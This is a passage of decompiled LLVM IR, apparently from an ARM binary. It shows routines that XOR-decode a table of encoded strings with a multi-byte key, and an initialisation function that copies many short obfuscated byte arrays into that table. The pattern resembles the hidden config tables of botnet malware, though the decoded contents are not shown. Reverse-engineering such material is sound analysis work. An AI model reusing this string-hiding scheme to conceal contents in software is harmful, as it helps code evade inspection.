  %v3_11334 = inttoptr i32 %v2_11334 to i8*
  %v4_11334 = load i8, i8* %v3_11334, align 1
  %v6_11334 = zext i8 %v4_11334 to i32
  %v2_11338 = xor i32 %v6_11334, %v1_11324
  %v1_1133c = trunc i32 %v2_11338 to i8
  store i8 %v1_1133c, i8* %v3_11334, align 1
  %v0_11340 = load i32, i32* %lr.global-to-local, align 4
  %v1_11340 = inttoptr i32 %v0_11340 to i32*
  %v2_11340 = load i32, i32* %v1_11340, align 4
  %v0_11344 = load i32, i32* %ip.global-to-local, align 4
  %v2_11344 = add i32 %v0_11344, %v2_11340
  %v3_11344 = inttoptr i32 %v2_11344 to i8*
  %v4_11344 = load i8, i8* %v3_11344, align 1
  %v6_11344 = zext i8 %v4_11344 to i32
  %v0_11348 = load i32, i32* %r6.global-to-local, align 4
  %v2_11348 = xor i32 %v0_11348, %v6_11344
  %v1_1134c = trunc i32 %v2_11348 to i8
  store i8 %v1_1134c, i8* %v3_11344, align 1
  %v0_11350 = load i32, i32* %lr.global-to-local, align 4
  %v1_11350 = inttoptr i32 %v0_11350 to i32*
  %v2_11350 = load i32, i32* %v1_11350, align 4
  %v0_11354 = load i32, i32* %ip.global-to-local, align 4
  %v2_11354 = add i32 %v0_11354, %v2_11350
  %v3_11354 = inttoptr i32 %v2_11354 to i8*
  %v4_11354 = load i8, i8* %v3_11354, align 1
  %v6_11354 = zext i8 %v4_11354 to i32
  %v0_11358 = load i32, i32* %r5.global-to-local, align 4
  %v2_11358 = xor i32 %v0_11358, %v6_11354
  %v1_1135c = trunc i32 %v2_11358 to i8
  store i8 %v1_1135c, i8* %v3_11354, align 1
  %v0_11360 = load i32, i32* %lr.global-to-local, align 4
  %v1_11360 = inttoptr i32 %v0_11360 to i32*
  %v2_11360 = load i32, i32* %v1_11360, align 4
  store i32 %v2_11360, i32* @r1, align 4
  %v0_11364 = load i32, i32* %ip.global-to-local, align 4
  %v2_11364 = add i32 %v0_11364, %v2_11360
  %v3_11364 = inttoptr i32 %v2_11364 to i8*
  %v4_11364 = load i8, i8* %v3_11364, align 1
  %v6_11364 = zext i8 %v4_11364 to i32
  %v0_11368 = load i32, i32* %r4.global-to-local, align 4
  %v2_11368 = xor i32 %v0_11368, %v6_11364
  %v1_1136c = trunc i32 %v2_11368 to i8
  store i8 %v1_1136c, i8* %v3_11364, align 1
  %v0_11370 = load i32, i32* %lr.global-to-local, align 4
  %v1_11370 = add i32 %v0_11370, 4
  %v2_11370 = inttoptr i32 %v1_11370 to i8*
  %v3_11370 = load i8, i8* %v2_11370, align 1
  %v4_11370 = zext i8 %v3_11370 to i32
  %v0_11374 = load i32, i32* %r7.global-to-local, align 4
  %v1_11374 = add i32 %v0_11374, 1
  %v2_11374 = inttoptr i32 %v1_11374 to i8*
  %v3_11374 = load i8, i8* %v2_11374, align 1
  %v4_11374 = zext i8 %v3_11374 to i32
  %v0_11378 = load i32, i32* %ip.global-to-local, align 4
  %v1_11378 = add i32 %v0_11378, 1
  store i32 %v1_11378, i32* %ip.global-to-local, align 4
  %v4_1137c = mul nuw nsw i32 %v4_11374, 256
  %v5_1137c = or i32 %v4_1137c, %v4_11370
  store i32 %v5_1137c, i32* @r2, align 4
  %v9_11380 = icmp eq i32 %v5_1137c, %v1_11378
  store i1 %v9_11380, i1* @cpsr_z, align 1
  %v8_11384 = icmp sgt i32 %v5_1137c, %v1_11378
  br i1 %v8_11384, label %dec_label_pc_11330, label %dec_label_pc_11388

dec_label_pc_11388:                               ; preds = %dec_label_pc_11330
  %v2_11388 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_11388, i32* @r4, align 4
  ret i32 %v1_11324

; uselistorder directives
  uselistorder i32 %v1_11378, { 1, 2, 3, 0 }
  uselistorder i32 %v0_11370, { 1, 0 }
  uselistorder i32 %v1_11324, { 0, 2, 1 }
  uselistorder i32 %v2_11300, { 3, 0, 1, 2, 4 }
}

define i32 @function_11394(i32 %arg1) local_unnamed_addr {
dec_label_pc_11394:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_11394 = mul i32 %arg1, 8
  %v3_11398 = load i32, i32* @r4, align 4
  store i32 %v3_11398, i32* %stack_var_-20, align 4
  %v3_113a8 = and i32 %v3_11394, 2040
  %v2_113ac = add i32 %v3_113a8, ptrtoint (i32* @global_var_1a740.266 to i32)
  store i32 %v2_113ac, i32* %lr.global-to-local, align 4
  %v1_113b4 = add i32 %v3_113a8, add (i32 ptrtoint (i32* @global_var_1a740.266 to i32), i32 4)
  store i32 %v1_113b4, i32* %r7.global-to-local, align 4
  %v2_113b8 = load i32, i32* @global_var_1a698.269, align 4
  %v2_113bc = inttoptr i32 %v1_113b4 to i8*
  %v3_113bc = load i8, i8* %v2_113bc, align 4
  %v4_113bc = zext i8 %v3_113bc to i32
  %v1_113c0 = add i32 %v3_113a8, add (i32 ptrtoint (i32* @global_var_1a740.266 to i32), i32 5)
  %v2_113c0 = inttoptr i32 %v1_113c0 to i8*
  %v3_113c0 = load i8, i8* %v2_113c0, align 1
  %v4_113c0 = zext i8 %v3_113c0 to i32
  %v3_113c4 = udiv i32 %v2_113b8, 256
  %v4_113c8 = mul nuw nsw i32 %v4_113c0, 256
  %v5_113c8 = or i32 %v4_113c8, %v4_113bc
  %v7_113c8 = icmp eq i32 %v5_113c8, 0
  %v3_113cc = udiv i32 %v2_113b8, 65536
  %v1_113d0 = urem i32 %v3_113c4, 256
  store i32 %v1_113d0, i32* %r6.global-to-local, align 4
  %v1_113d4 = urem i32 %v3_113cc, 256
  store i32 %v1_113d4, i32* %r5.global-to-local, align 4
  %v3_113d8 = udiv i32 %v2_113b8, 16777216
  store i32 %v3_113d8, i32* %r4.global-to-local, align 4
  %v1_113dc = urem i32 %v2_113b8, 256
  br i1 %v7_113c8, label %bb, label %bb8

bb:                                               ; preds = %dec_label_pc_11394
  store i32 %v3_11398, i32* @r4, align 4
  ret i32 %v1_113dc

bb8:                                              ; preds = %dec_label_pc_11394
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_113e8

dec_label_pc_113e8:                               ; preds = %dec_label_pc_113e8, %bb8
  %v2_113f4 = phi i32 [ %v1_11430, %dec_label_pc_113e8 ], [ 0, %bb8 ]
  %v0_113e8 = phi i32 [ %v0_11428, %dec_label_pc_113e8 ], [ %v2_113ac, %bb8 ]
  %v1_113e8 = inttoptr i32 %v0_113e8 to i32*
  %v2_113e8 = load i32, i32* %v1_113e8, align 4
  %v2_113ec = add i32 %v2_113e8, %v2_113f4
  %v3_113ec = inttoptr i32 %v2_113ec to i8*
  %v4_113ec = load i8, i8* %v3_113ec, align 1
  %v6_113ec = zext i8 %v4_113ec to i32
  %v2_113f0 = xor i32 %v6_113ec, %v1_113dc
  %v1_113f4 = trunc i32 %v2_113f0 to i8
  store i8 %v1_113f4, i8* %v3_113ec, align 1
  %v0_113f8 = load i32, i32* %lr.global-to-local, align 4
  %v1_113f8 = inttoptr i32 %v0_113f8 to i32*
  %v2_113f8 = load i32, i32* %v1_113f8, align 4
  %v0_113fc = load i32, i32* %ip.global-to-local, align 4
  %v2_113fc = add i32 %v0_113fc, %v2_113f8
  %v3_113fc = inttoptr i32 %v2_113fc to i8*
  %v4_113fc = load i8, i8* %v3_113fc, align 1
  %v6_113fc = zext i8 %v4_113fc to i32
  %v0_11400 = load i32, i32* %r6.global-to-local, align 4
  %v2_11400 = xor i32 %v0_11400, %v6_113fc
  %v1_11404 = trunc i32 %v2_11400 to i8
  store i8 %v1_11404, i8* %v3_113fc, align 1
  %v0_11408 = load i32, i32* %lr.global-to-local, align 4
  %v1_11408 = inttoptr i32 %v0_11408 to i32*
  %v2_11408 = load i32, i32* %v1_11408, align 4
  %v0_1140c = load i32, i32* %ip.global-to-local, align 4
  %v2_1140c = add i32 %v0_1140c, %v2_11408
  %v3_1140c = inttoptr i32 %v2_1140c to i8*
  %v4_1140c = load i8, i8* %v3_1140c, align 1
  %v6_1140c = zext i8 %v4_1140c to i32
  %v0_11410 = load i32, i32* %r5.global-to-local, align 4
  %v2_11410 = xor i32 %v0_11410, %v6_1140c
  %v1_11414 = trunc i32 %v2_11410 to i8
  store i8 %v1_11414, i8* %v3_1140c, align 1
  %v0_11418 = load i32, i32* %lr.global-to-local, align 4
  %v1_11418 = inttoptr i32 %v0_11418 to i32*
  %v2_11418 = load i32, i32* %v1_11418, align 4
  %v0_1141c = load i32, i32* %ip.global-to-local, align 4
  %v2_1141c = add i32 %v0_1141c, %v2_11418
  %v3_1141c = inttoptr i32 %v2_1141c to i8*
  %v4_1141c = load i8, i8* %v3_1141c, align 1
  %v6_1141c = zext i8 %v4_1141c to i32
  %v0_11420 = load i32, i32* %r4.global-to-local, align 4
  %v2_11420 = xor i32 %v0_11420, %v6_1141c
  %v1_11424 = trunc i32 %v2_11420 to i8
  store i8 %v1_11424, i8* %v3_1141c, align 1
  %v0_11428 = load i32, i32* %lr.global-to-local, align 4
  %v1_11428 = add i32 %v0_11428, 4
  %v2_11428 = inttoptr i32 %v1_11428 to i8*
  %v3_11428 = load i8, i8* %v2_11428, align 1
  %v4_11428 = zext i8 %v3_11428 to i32
  %v0_1142c = load i32, i32* %r7.global-to-local, align 4
  %v1_1142c = add i32 %v0_1142c, 1
  %v2_1142c = inttoptr i32 %v1_1142c to i8*
  %v3_1142c = load i8, i8* %v2_1142c, align 1
  %v4_1142c = zext i8 %v3_1142c to i32
  %v0_11430 = load i32, i32* %ip.global-to-local, align 4
  %v1_11430 = add i32 %v0_11430, 1
  store i32 %v1_11430, i32* %ip.global-to-local, align 4
  %v4_11434 = mul nuw nsw i32 %v4_1142c, 256
  %v5_11434 = or i32 %v4_11434, %v4_11428
  %v8_1143c = icmp sgt i32 %v5_11434, %v1_11430
  br i1 %v8_1143c, label %dec_label_pc_113e8, label %dec_label_pc_11440

dec_label_pc_11440:                               ; preds = %dec_label_pc_113e8
  %v2_11440 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_11440, i32* @r4, align 4
  ret i32 %v1_113dc

; uselistorder directives
  uselistorder i32 %v1_11430, { 1, 2, 0 }
  uselistorder i32 %v0_11428, { 1, 0 }
  uselistorder i32 %v1_113dc, { 0, 2, 1 }
  uselistorder i32 %v2_113b8, { 3, 0, 1, 2 }
  uselistorder i32 16777216, { 0, 1, 3, 2, 5, 4, 9, 6, 8, 7, 10, 12, 11, 14, 13, 16, 15, 17, 18, 25, 19, 26, 20, 27, 21, 28, 29, 22, 30, 23, 31, 24, 33, 32, 37, 34, 38, 35, 39, 36, 42, 40, 43, 41, 44, 45, 46, 51, 47, 52, 48, 53, 49, 54, 50, 55, 56, 57, 58, 59, 60, 62, 61, 64, 63, 65, 66, 68, 67, 73, 69, 74, 70, 75, 71, 76, 72, 78, 77, 79, 82, 80, 81, 83, 84, 87, 85, 86, 90, 88, 91, 89, 92, 95, 93, 94, 96, 97, 100, 98, 99, 103, 101, 104, 102, 105, 106, 107, 108, 115, 109, 116, 117, 110, 118, 113, 119, 111, 120, 121, 112, 114, 122, 123, 127, 124, 128, 129, 125, 126, 130, 131, 132, 134, 133, 135 }
}

define i32 @function_1144c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1144c:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1144c = load i32, i32* @r4, align 4
  store i32 %v3_1144c, i32* %stack_var_-36, align 4
  %v1_11454 = call i32* @malloc(i32 2)
  %v2_11454 = ptrtoint i32* %v1_11454 to i32
  store i32 ptrtoint (i32* @global_var_1a740.266 to i32), i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 2, i32* %r8.global-to-local, align 4
  store i32 %v2_11454, i32* %r5.global-to-local, align 4
  %v4_11470 = call i32 @function_11a58(i32 %v2_11454, i32 ptrtoint ([3 x i8]* @global_var_12324.274 to i32), i32 2)
  %v0_11478 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11478, i32* @global_var_1a748.275, align 4
  %v0_1147c = load i32, i32* %r8.global-to-local, align 4
  %v1_1147c = trunc i32 %v0_1147c to i8
  store i8 %v1_1147c, i8* bitcast (i32* @global_var_1a74c.276 to i8*), align 4
  %v0_11480 = load i32, i32* %r6.global-to-local, align 4
  %v1_11480 = trunc i32 %v0_11480 to i8
  store i8 %v1_11480, i8* bitcast (i32* @global_var_1a74d.277 to i8*), align 4
  %v1_11484 = call i32* @malloc(i32 13)
  %v3_11484 = ptrtoint i32* %v1_11484 to i32
  store i32 ptrtoint ([14 x i8]* @global_var_12328.279 to i32), i32* %sl.global-to-local, align 4
  store i32 13, i32* %r5.global-to-local, align 4
  store i32 %v3_11484, i32* %r7.global-to-local, align 4
  %v4_1149c = call i32 @function_11a58(i32 %v3_11484, i32 ptrtoint ([14 x i8]* @global_var_12328.279 to i32), i32 13)
  %v0_114a0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v3_11484, i32* @global_var_1a750.280, align 4
  %v1_114a8 = trunc i32 %v0_114a0 to i8
  store i8 %v1_114a8, i8* bitcast (i32* @global_var_1a754.281 to i8*), align 4
  %v0_114ac = load i32, i32* %r6.global-to-local, align 4
  %v1_114ac = trunc i32 %v0_114ac to i8
  store i8 %v1_114ac, i8* bitcast (i32* @global_var_1a755.282 to i8*), align 4
  %v1_114b0 = call i32* @malloc(i32 %v0_114a0)
  %v3_114b0 = ptrtoint i32* %v1_114b0 to i32
  %v0_114b4 = load i32, i32* %sl.global-to-local, align 4
  %v0_114b8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v3_114b0, i32* %r7.global-to-local, align 4
  %v4_114c0 = call i32 @function_11a58(i32 %v3_114b0, i32 %v0_114b4, i32 %v0_114b8)
  %v0_114c4 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v3_114b0, i32* @global_var_1a758.283, align 4
  %v0_114cc = load i32, i32* %r5.global-to-local, align 4
  %v1_114cc = trunc i32 %v0_114cc to i8
  store i8 %v1_114cc, i8* bitcast (i32* @global_var_1a75c.284 to i8*), align 4
  %v0_114d0 = load i32, i32* %r6.global-to-local, align 4
  %v1_114d0 = trunc i32 %v0_114d0 to i8
  store i8 %v1_114d0, i8* bitcast (i32* @global_var_1a75d.285 to i8*), align 4
  %v1_114d4 = call i32* @malloc(i32 %v0_114c4)
  %v3_114d4 = ptrtoint i32* %v1_114d4 to i32
  %v0_114d8 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v3_114d4, i32* %r5.global-to-local, align 4
  %v3_114e4 = call i32 @function_11a58(i32 %v3_114d4, i32 ptrtoint (i32* @global_var_12338.287 to i32), i32 %v0_114d8)
  %v0_114ec = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_114ec, i32* @global_var_1a760.288, align 4
  %v0_114f0 = load i32, i32* %r8.global-to-local, align 4
  %v1_114f0 = trunc i32 %v0_114f0 to i8
  store i8 %v1_114f0, i8* bitcast (i32* @global_var_1a764.289 to i8*), align 4
  %v0_114f4 = load i32, i32* %r6.global-to-local, align 4
  %v1_114f4 = trunc i32 %v0_114f4 to i8
  store i8 %v1_114f4, i8* bitcast (i32* @global_var_1a765.290 to i8*), align 4
  %v1_114f8 = call i32* @malloc(i32 29)
  %v3_114f8 = ptrtoint i32* %v1_114f8 to i32
  store i32 %v3_114f8, i32* %r5.global-to-local, align 4
  %v3_11508 = call i32 @function_11a58(i32 %v3_114f8, i32 ptrtoint (i32* @global_var_124b8.292 to i32), i32 29)
  store i8 29, i8* bitcast (i32* @global_var_1a76c.293 to i8*), align 4
  %v0_11518 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11518, i32* @global_var_1a768.294, align 4
  %v0_1151c = load i32, i32* %r6.global-to-local, align 4
  %v1_1151c = trunc i32 %v0_1151c to i8
  store i8 %v1_1151c, i8* bitcast (i32* @global_var_1a76d.295 to i8*), align 4
  %v1_11520 = call i32* @malloc(i32 6)
  %v2_11520 = ptrtoint i32* %v1_11520 to i32
  store i32 6, i32* %fp.global-to-local, align 4
  store i32 %v2_11520, i32* %r5.global-to-local, align 4
  %v4_11534 = call i32 @function_11a58(i32 %v2_11520, i32 ptrtoint ([7 x i8]* @global_var_1233c.297 to i32), i32 6)
  %v0_1153c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1153c, i32* @global_var_1a770.298, align 4
  store i8 6, i8* bitcast (i32* @global_var_1a774.299 to i8*), align 4
  %v0_11544 = load i32, i32* %r6.global-to-local, align 4
  %v1_11544 = trunc i32 %v0_11544 to i8
  store i8 %v1_11544, i8* bitcast (i32* @global_var_1a775.300 to i8*), align 4
  %v1_11548 = call i32* @malloc(i32 7)
  %v2_11548 = ptrtoint i32* %v1_11548 to i32
  %v0_1154c = load i32, i32* %r8.global-to-local, align 4
  %v1_1154c = add i32 %v0_1154c, 5
  store i32 %v1_1154c, i32* %r8.global-to-local, align 4
  store i32 %v2_11548, i32* %r5.global-to-local, align 4
  %v4_1155c = call i32 @function_11a58(i32 %v2_11548, i32 ptrtoint ([8 x i8]* @global_var_12344.302 to i32), i32 %v1_1154c)
  %v0_11560 = load i32, i32* %r8.global-to-local, align 4
  %v0_11564 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11564, i32* @global_var_1a778.303, align 4
  %v1_11568 = trunc i32 %v0_11560 to i8
  store i8 %v1_11568, i8* bitcast (i32* @global_var_1a77c.304 to i8*), align 4
  %v0_1156c = load i32, i32* %r6.global-to-local, align 4
  %v1_1156c = trunc i32 %v0_1156c to i8
  store i8 %v1_1156c, i8* bitcast (i32* @global_var_1a77d.305 to i8*), align 4
  %v1_11570 = call i32* @malloc(i32 %v0_11560)
  %v3_11570 = ptrtoint i32* %v1_11570 to i32
  %v0_11574 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v3_11570, i32* %r5.global-to-local, align 4
  %v4_11580 = call i32 @function_11a58(i32 %v3_11570, i32 ptrtoint ([8 x i8]* @global_var_1234c.307 to i32), i32 %v0_11574)
  %v0_11588 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11588, i32* @global_var_1a780.308, align 4
  %v0_1158c = load i32, i32* %r8.global-to-local, align 4
  %v1_1158c = trunc i32 %v0_1158c to i8
  store i8 %v1_1158c, i8* bitcast (i32* @global_var_1a784.309 to i8*), align 4
  %v0_11590 = load i32, i32* %r6.global-to-local, align 4
  %v1_11590 = trunc i32 %v0_11590 to i8
  store i8 %v1_11590, i8* bitcast (i32* @global_var_1a785.310 to i8*), align 4
  %v1_11594 = call i32* @malloc(i32 3)
  %v3_11594 = ptrtoint i32* %v1_11594 to i32
  store i32 %v3_11594, i32* %r5.global-to-local, align 4
  %v4_115a4 = call i32 @function_11a58(i32 %v3_11594, i32 ptrtoint ([4 x i8]* @global_var_12354.312 to i32), i32 3)
  store i8 3, i8* bitcast (i32* @global_var_1a78c.313 to i8*), align 4
  %v0_115b4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_115b4, i32* @global_var_1a788.314, align 4
  %v0_115b8 = load i32, i32* %r6.global-to-local, align 4
  %v1_115b8 = trunc i32 %v0_115b8 to i8
  store i8 %v1_115b8, i8* bitcast (i32* @global_var_1a78d.315 to i8*), align 4
  %v1_115bc = call i32* @malloc(i32 19)
  %v3_115bc = ptrtoint i32* %v1_115bc to i32
  store i32 %v3_115bc, i32* %r5.global-to-local, align 4
  %v3_115cc = call i32 @function_11a58(i32 %v3_115bc, i32 ptrtoint (i32* @global_var_12358.317 to i32), i32 19)
  store i8 19, i8* bitcast (i32* @global_var_1a794.318 to i8*), align 4
  %v0_115dc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_115dc, i32* @global_var_1a790.319, align 4
  %v0_115e0 = load i32, i32* %r6.global-to-local, align 4
  %v1_115e0 = trunc i32 %v0_115e0 to i8
  store i8 %v1_115e0, i8* bitcast (i32* @global_var_1a795.320 to i8*), align 4
  %v1_115e4 = call i32* @malloc(i32 24)
  %v3_115e4 = ptrtoint i32* %v1_115e4 to i32
  store i32 %v3_115e4, i32* %r5.global-to-local, align 4
  %v3_115f4 = call i32 @function_11a58(i32 %v3_115e4, i32 ptrtoint (i32* @global_var_1236c.322 to i32), i32 24)
  store i8 24, i8* bitcast (i32* @global_var_1a79c.323 to i8*), align 4
  %v0_11604 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11604, i32* @global_var_1a798.324, align 4
  %v0_11608 = load i32, i32* %r6.global-to-local, align 4
  %v1_11608 = trunc i32 %v0_11608 to i8
  store i8 %v1_11608, i8* bitcast (i32* @global_var_1a79d.325 to i8*), align 4
  %v1_1160c = call i32* @malloc(i32 9)
  %v3_1160c = ptrtoint i32* %v1_1160c to i32
  store i32 %v3_1160c, i32* %r5.global-to-local, align 4
  %v4_1161c = call i32 @function_11a58(i32 %v3_1160c, i32 ptrtoint ([10 x i8]* @global_var_12388.327 to i32), i32 9)
  store i8 9, i8* bitcast (i32* @global_var_1a7a4.328 to i8*), align 4
  %v0_1162c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1162c, i32* @global_var_1a7a0.329, align 4
  %v0_11630 = load i32, i32* %r6.global-to-local, align 4
  %v1_11630 = trunc i32 %v0_11630 to i8
  store i8 %v1_11630, i8* bitcast (i32* @global_var_1a7a5.330 to i8*), align 4
  %v1_11634 = call i32* @malloc(i32 16)
  %v2_11634 = ptrtoint i32* %v1_11634 to i32
  store i32 16, i32* %sl.global-to-local, align 4
  store i32 %v2_11634, i32* %r5.global-to-local, align 4
  %v4_11648 = call i32 @function_11a58(i32 %v2_11634, i32 ptrtoint ([17 x i8]* @global_var_12394.332 to i32), i32 16)
  %v0_11650 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11650, i32* @global_var_1a7a8.333, align 4
  store i8 16, i8* bitcast (i32* @global_var_1a7ac.334 to i8*), align 4
  %v0_11658 = load i32, i32* %r6.global-to-local, align 4
  %v1_11658 = trunc i32 %v0_11658 to i8
  store i8 %v1_11658, i8* bitcast (i32* @global_var_1a7ad.335 to i8*), align 4
  %v1_1165c = call i32* @malloc(i32 22)
  %v3_1165c = ptrtoint i32* %v1_1165c to i32
  store i32 %v3_1165c, i32* %r5.global-to-local, align 4
  %v4_1166c = call i32 @function_11a58(i32 %v3_1165c, i32 ptrtoint ([23 x i8]* @global_var_123a8.337 to i32), i32 22)
  %v0_11674 = load i32, i32* %r8.global-to-local, align 4
  store i8 22, i8* bitcast (i32* @global_var_1a7b4.338 to i8*), align 4
  %v0_1167c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1167c, i32* @global_var_1a7b0.339, align 4
  %v0_11680 = load i32, i32* %r6.global-to-local, align 4
  %v1_11680 = trunc i32 %v0_11680 to i8
  store i8 %v1_11680, i8* bitcast (i32* @global_var_1a7b5.340 to i8*), align 4
  %v1_11684 = call i32* @malloc(i32 %v0_11674)
  %v3_11684 = ptrtoint i32* %v1_11684 to i32
  %v0_11688 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v3_11684, i32* %r5.global-to-local, align 4
  %v4_11694 = call i32 @function_11a58(i32 %v3_11684, i32 ptrtoint ([8 x i8]* @global_var_123c0.342 to i32), i32 %v0_11688)
  %v0_1169c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1169c, i32* @global_var_1a7b8.343, align 4
  %v0_116a0 = load i32, i32* %r8.global-to-local, align 4
  %v1_116a0 = trunc i32 %v0_116a0 to i8
  store i8 %v1_116a0, i8* bitcast (i32* @global_var_1a7bc.344 to i8*), align 4
  %v0_116a4 = load i32, i32* %r6.global-to-local, align 4
  %v1_116a4 = trunc i32 %v0_116a4 to i8
  store i8 %v1_116a4, i8* bitcast (i32* @global_var_1a7bd.345 to i8*), align 4
  %v1_116a8 = call i32* @malloc(i32 5)
  %v3_116a8 = ptrtoint i32* %v1_116a8 to i32
  store i32 %v3_116a8, i32* %r5.global-to-local, align 4
  %v4_116b8 = call i32 @function_11a58(i32 %v3_116a8, i32 ptrtoint ([6 x i8]* @global_var_123c8.347 to i32), i32 5)
  store i8 5, i8* bitcast (i32* @global_var_1a7c4.348 to i8*), align 4
  %v0_116c8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_116c8, i32* @global_var_1a7c0.349, align 4
  %v0_116cc = load i32, i32* %r6.global-to-local, align 4
  %v1_116cc = trunc i32 %v0_116cc to i8
  store i8 %v1_116cc, i8* bitcast (i32* @global_var_1a7c5.350 to i8*), align 4
  %v1_116d0 = call i32* @malloc(i32 4)
  %v3_116d0 = ptrtoint i32* %v1_116d0 to i32
  store i32 %v3_116d0, i32* %r5.global-to-local, align 4
  %v4_116e0 = call i32 @function_11a58(i32 %v3_116d0, i32 ptrtoint ([5 x i8]* @global_var_123d0.352 to i32), i32 4)
  %v0_116e8 = load i32, i32* %fp.global-to-local, align 4
  store i8 4, i8* bitcast (i32* @global_var_1a7cc.353 to i8*), align 4
  %v0_116f0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_116f0, i32* @global_var_1a7c8.354, align 4
  %v0_116f4 = load i32, i32* %r6.global-to-local, align 4
  %v1_116f4 = trunc i32 %v0_116f4 to i8
  store i8 %v1_116f4, i8* bitcast (i32* @global_var_1a7cd.355 to i8*), align 4
  %v1_116f8 = call i32* @malloc(i32 %v0_116e8)
  %v3_116f8 = ptrtoint i32* %v1_116f8 to i32
  %v0_11700 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v3_116f8, i32* %r5.global-to-local, align 4
  %v4_11708 = call i32 @function_11a58(i32 %v3_116f8, i32 ptrtoint ([7 x i8]* @global_var_123d8.357 to i32), i32 %v0_11700)
  %v0_11710 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11710, i32* @global_var_1a7d0.358, align 4
  %v1_11714 = trunc i32 %v0_11700 to i8
  store i8 %v1_11714, i8* bitcast (i32* @global_var_1a7d4.359 to i8*), align 4
  %v0_11718 = load i32, i32* %r6.global-to-local, align 4
  %v1_11718 = trunc i32 %v0_11718 to i8
  store i8 %v1_11718, i8* bitcast (i32* @global_var_1a7d5.360 to i8*), align 4
  %v1_1171c = call i32* @malloc(i32 14)
  %v2_1171c = ptrtoint i32* %v1_1171c to i32
  store i32 %v2_1171c, i32* %r5.global-to-local, align 4
  store i32 14, i32* %sb.global-to-local, align 4
  %v4_11730 = call i32 @function_11a58(i32 %v2_1171c, i32 ptrtoint ([15 x i8]* @global_var_123e0.362 to i32), i32 14)
  %v0_11738 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11738, i32* @global_var_1a7d8.363, align 4
  store i8 14, i8* bitcast (i32* @global_var_1a7dc.364 to i8*), align 4
  %v0_11740 = load i32, i32* %r6.global-to-local, align 4
  %v1_11740 = trunc i32 %v0_11740 to i8
  store i8 %v1_11740, i8* bitcast (i32* @global_var_1a7dd.365 to i8*), align 4
  %v1_11744 = call i32* @malloc(i32 8)
  %v2_11744 = ptrtoint i32* %v1_11744 to i32
  store i32 8, i32* %r7.global-to-local, align 4
  store i32 %v2_11744, i32* %r5.global-to-local, align 4
  %v4_11758 = call i32 @function_11a58(i32 %v2_11744, i32 ptrtoint ([9 x i8]* @global_var_123f0.367 to i32), i32 8)
  %v0_1175c = load i32, i32* %r8.global-to-local, align 4
  %v0_11760 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11760, i32* @global_var_1a840.368, align 4
  store i8 8, i8* bitcast (i32* @global_var_1a844.369 to i8*), align 4
  %v0_11768 = load i32, i32* %r6.global-to-local, align 4
  %v1_11768 = trunc i32 %v0_11768 to i8
  store i8 %v1_11768, i8* bitcast (i32* @global_var_1a845.370 to i8*), align 4
  %v1_1176c = call i32* @malloc(i32 %v0_1175c)
  %v3_1176c = ptrtoint i32* %v1_1176c to i32
  %v0_11770 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v3_1176c, i32* %r5.global-to-local, align 4
  %v4_1177c = call i32 @function_11a58(i32 %v3_1176c, i32 ptrtoint ([8 x i8]* @global_var_123fc.372 to i32), i32 %v0_11770)
  %v0_11780 = load i32, i32* %sl.global-to-local, align 4
  %v0_11784 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11784, i32* @global_var_1a848.373, align 4
  %v0_11788 = load i32, i32* %r8.global-to-local, align 4
  %v1_11788 = trunc i32 %v0_11788 to i8
  store i8 %v1_11788, i8* bitcast (i32* @global_var_1a84c.374 to i8*), align 4
  %v0_1178c = load i32, i32* %r6.global-to-local, align 4
  %v1_1178c = trunc i32 %v0_1178c to i8
  %v2_1178c = load i32, i32* %r4.global-to-local, align 4
  %v3_1178c = add i32 %v2_1178c, 269
  %v4_1178c = inttoptr i32 %v3_1178c to i8*
  store i8 %v1_1178c, i8* %v4_1178c, align 1
  %v1_11790 = call i32* @malloc(i32 %v0_11780)
  %v3_11790 = ptrtoint i32* %v1_11790 to i32
  %v0_11798 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v3_11790, i32* %r5.global-to-local, align 4
  %v4_117a0 = call i32 @function_11a58(i32 %v3_11790, i32 ptrtoint ([17 x i8]* @global_var_12404.376 to i32), i32 %v0_11798)
  %v0_117a8 = load i32, i32* %r5.global-to-local, align 4
